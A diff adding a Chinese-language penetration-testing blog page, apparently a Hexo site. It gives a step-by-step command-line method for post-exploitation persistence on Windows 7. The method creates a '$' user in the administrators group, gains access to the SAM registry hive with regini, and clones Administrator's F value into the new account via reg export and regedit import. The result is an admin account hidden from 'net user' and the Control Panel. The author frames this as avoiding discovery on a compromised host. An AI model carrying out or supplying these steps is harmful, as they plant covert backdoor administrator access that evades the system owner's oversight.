@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="场景：后渗透在命令行下添加隐藏用户。 遇到一种情况：外网开了3389但是远程登录提示内部错误，查了下可能是用户远程桌面登录后断开没有注销导致，这时候就需要添加一个帐号来远程连接，又不想轻易被发现，所以就需要创建隐藏帐号（开机启动和控制面板都不能被发现）。网上查到的都是界面操作，命令行下的方法没找到，因此记录一下。 原理：SID：安全标识符（Security Identifiers），是标识用户、组">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持：Windows命令行下通过修改注册表创建隐藏帐号">
+<meta property="og:url" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="场景：后渗透在命令行下添加隐藏用户。 遇到一种情况：外网开了3389但是远程登录提示内部错误，查了下可能是用户远程桌面登录后断开没有注销导致，这时候就需要添加一个帐号来远程连接，又不想轻易被发现，所以就需要创建隐藏帐号（开机启动和控制面板都不能被发现）。网上查到的都是界面操作，命令行下的方法没找到，因此记录一下。 原理：SID：安全标识符（Security Identifiers），是标识用户、组">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118162416726.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118170352532.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118170234490.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118163401311.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118164057486.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118164512199.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118165305029.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118165829455.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118170539082.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118170844837.png">
+<meta property="article:published_time" content="2021-01-18T06:04:39.000Z">
+<meta property="article:modified_time" content="2021-01-18T06:04:39.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/tmpimgs/image-20210118162416726.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>权限维持：Windows命令行下通过修改注册表创建隐藏帐号</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/01/13/%E8%87%B4%E8%BF%9COA%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&text=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&is_video=false&description=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=权限维持：Windows命令行下通过修改注册表创建隐藏帐号&body=Check out this article: http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&name=权限维持：Windows命令行下通过修改注册表创建隐藏帐号&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&t=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#场景："><span class="toc-number">1.</span> <span class="toc-text">场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#原理："><span class="toc-number">2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验环境："><span class="toc-number">3.</span> <span class="toc-text">实验环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令行下操作方法"><span class="toc-number">4.</span> <span class="toc-text">命令行下操作方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1、创建用户："><span class="toc-number">4.1.</span> <span class="toc-text">1、创建用户：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2、查询注册表"><span class="toc-number">4.2.</span> <span class="toc-text">2、查询注册表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3、导出新建用户的注册项"><span class="toc-number">4.3.</span> <span class="toc-text">3、导出新建用户的注册项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4、将administrator注册表导出"><span class="toc-number">4.4.</span> <span class="toc-text">4、将administrator注册表导出</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5、修改注册文件"><span class="toc-number">4.5.</span> <span class="toc-text">5、修改注册文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6、命令行下删除test1-用户"><span class="toc-number">4.6.</span> <span class="toc-text">6、命令行下删除test1$用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7、重新导入文件"><span class="toc-number">4.7.</span> <span class="toc-text">7、重新导入文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接："><span class="toc-number">5.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        权限维持：Windows命令行下通过修改注册表创建隐藏帐号
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-18T06:04:39.000Z" itemprop="datePublished">2021-01-18</time>
+        
+        (Updated: <time datetime="2021-01-18T06:04:39.000Z" itemprop="dateModified">2021-01-18</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Windows/" rel="tag">Windows</a>, <a class="tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="场景："><a href="#场景：" class="headerlink" title="场景："></a>场景：</h4><p>后渗透<strong>在命令行</strong>下添加隐藏用户。</p>
+<p>遇到一种情况：外网开了3389但是远程登录提示内部错误，查了下可能是用户远程桌面登录后断开没有注销导致，这时候就需要添加一个帐号来远程连接，又不想轻易被发现，所以就需要创建隐藏帐号（开机启动和控制面板都不能被发现）。网上查到的都是界面操作，命令行下的方法没找到，因此记录一下。</p>
+<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>SID：安全标识符（Security Identifiers），是标识用户、组和计算机账户的唯一的号码。</p>
+<p>在注册表中有两处保存了帐号的SID，一是注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users 下的子键名，另一处是该子键的子项F的值。但是Windows查询时用前者，登录时用的是后者，并且不同步两者。当用Administrator的F值覆盖其他帐号的F值后，帐号登录是管理员权限，但查询只会显示Administrator不会显示该帐号，因此可以创建隐藏帐号。</p>
+<h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows 7</span><br><span class="line">权限：system</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令行下操作方法"><a href="#命令行下操作方法" class="headerlink" title="命令行下操作方法"></a>命令行下操作方法</h4><h5 id="1、创建用户："><a href="#1、创建用户：" class="headerlink" title="1、创建用户："></a>1、创建用户：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test1$ test@123 &#x2F;add</span><br><span class="line">net localgroup administrators test1$ &#x2F;add</span><br></pre></td></tr></table></figure>
+
+<p><img src="tmpimgs/image-20210118162416726.png" alt="image-20210118162416726"></p>
+<p>因为加了$，命令行下看不到test1$用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+
+<p><img src="tmpimgs/image-20210118170352532.png" alt="image-20210118170352532"></p>
+<p>但是控制面板还是可以看到用户</p>
+<p><img src="tmpimgs/image-20210118170234490.png" alt="image-20210118170234490"></p>
+<h5 id="2、查询注册表"><a href="#2、查询注册表" class="headerlink" title="2、查询注册表"></a>2、查询注册表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SAM\SAM\Domains\Account\Users\Names\test1$ &#x2F;ve</span><br></pre></td></tr></table></figure>
+
+<p>查询结果显示如下</p>
+<p><img src="tmpimgs/image-20210118163401311.png" alt="image-20210118163401311"></p>
+<p>备注：如果是administrator权限，需要先给administrator加权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># [1 8 17]表示赋予 administrator、everyone、system分别是完全控制、只读、完全控制权限</span><br><span class="line">echo HKLM\SAM\SAM\Domains\Account\Users [1 8 17] &gt;regini.ini</span><br><span class="line">regini regini.ini</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、导出新建用户的注册项"><a href="#3、导出新建用户的注册项" class="headerlink" title="3、导出新建用户的注册项"></a>3、导出新建用户的注册项</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg export HKLM\SAM\SAM\Domains\Account\Users\Names\test1$ C:\test1.reg</span><br><span class="line">type C:\test1.reg</span><br></pre></td></tr></table></figure>
+
+<p>可以看到类型为3ea，十六进制补全000003ea</p>
+<p><img src="tmpimgs/image-20210118164057486.png" alt="image-20210118164057486"></p>
+<p>根据类型名称000003ea找到注册表项并导出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SAM\SAM\Domains\Account\Users\000003ea </span><br><span class="line">reg export HKLM\SAM\SAM\Domains\Account\Users\000003ea c:\3ea.reg</span><br></pre></td></tr></table></figure>
+
+<p><img src="tmpimgs/image-20210118164512199.png" alt="image-20210118164512199"></p>
+<h5 id="4、将administrator注册表导出"><a href="#4、将administrator注册表导出" class="headerlink" title="4、将administrator注册表导出"></a>4、将administrator注册表导出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认administrator是000001f4</span><br><span class="line">reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001f4 C:\admin.reg</span><br></pre></td></tr></table></figure>
+
+<p><img src="tmpimgs/image-20210118165305029.png" alt="image-20210118165305029"></p>
+<h5 id="5、修改注册文件"><a href="#5、修改注册文件" class="headerlink" title="5、修改注册文件"></a>5、修改注册文件</h5><p>下载3ea.reg到本地，修改3ea.reg的F值为admin的F值，然后在上传到目标机</p>
+<p><img src="tmpimgs/image-20210118165829455.png" alt="image-20210118165829455"></p>
+<h5 id="6、命令行下删除test1-用户"><a href="#6、命令行下删除test1-用户" class="headerlink" title="6、命令行下删除test1$用户"></a>6、命令行下删除test1$用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test1$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<p><img src="tmpimgs/image-20210118170539082.png" alt="image-20210118170539082"></p>
+<h5 id="7、重新导入文件"><a href="#7、重新导入文件" class="headerlink" title="7、重新导入文件"></a>7、重新导入文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit &#x2F;s c:\test1.reg</span><br><span class="line">regedit &#x2F;s c:\3ea.reg</span><br></pre></td></tr></table></figure>
+
+<p>导入后 可以通过<code>net user test1$</code>查询到，但是<code>net user</code>和控制面板都看不到</p>
+<p><img src="tmpimgs/image-20210118170844837.png" alt="image-20210118170844837"></p>
+<p>界面操作可以参考<a href="https://blog.csdn.net/qq_33020901/article/details/78764816" target="_blank" rel="noopener">渗透技巧—Windows系统的帐户隐藏</a>。</p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://blog.csdn.net/qq_33020901/article/details/78764816" target="_blank" rel="noopener">渗透技巧—Windows系统的帐户隐藏</a></p>
+<p><a href="https://www.qingsword.com/qing/163.html" target="_blank" rel="noopener">使用Windows命令行reg控制注册表键值</a></p>
+<p><a href="https://blog.csdn.net/weixin_33826268/article/details/92316569" target="_blank" rel="noopener">Regini修改注册表权限命令</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#场景："><span class="toc-number">1.</span> <span class="toc-text">场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#原理："><span class="toc-number">2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验环境："><span class="toc-number">3.</span> <span class="toc-text">实验环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令行下操作方法"><span class="toc-number">4.</span> <span class="toc-text">命令行下操作方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1、创建用户："><span class="toc-number">4.1.</span> <span class="toc-text">1、创建用户：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2、查询注册表"><span class="toc-number">4.2.</span> <span class="toc-text">2、查询注册表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3、导出新建用户的注册项"><span class="toc-number">4.3.</span> <span class="toc-text">3、导出新建用户的注册项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4、将administrator注册表导出"><span class="toc-number">4.4.</span> <span class="toc-text">4、将administrator注册表导出</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5、修改注册文件"><span class="toc-number">4.5.</span> <span class="toc-text">5、修改注册文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6、命令行下删除test1-用户"><span class="toc-number">4.6.</span> <span class="toc-text">6、命令行下删除test1$用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7、重新导入文件"><span class="toc-number">4.7.</span> <span class="toc-text">7、重新导入文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接："><span class="toc-number">5.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&text=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&is_video=false&description=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=权限维持：Windows命令行下通过修改注册表创建隐藏帐号&body=Check out this article: http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/01/18/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/&title=权限维持：Windows命令行下通过修改注册表创建隐藏帐号" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
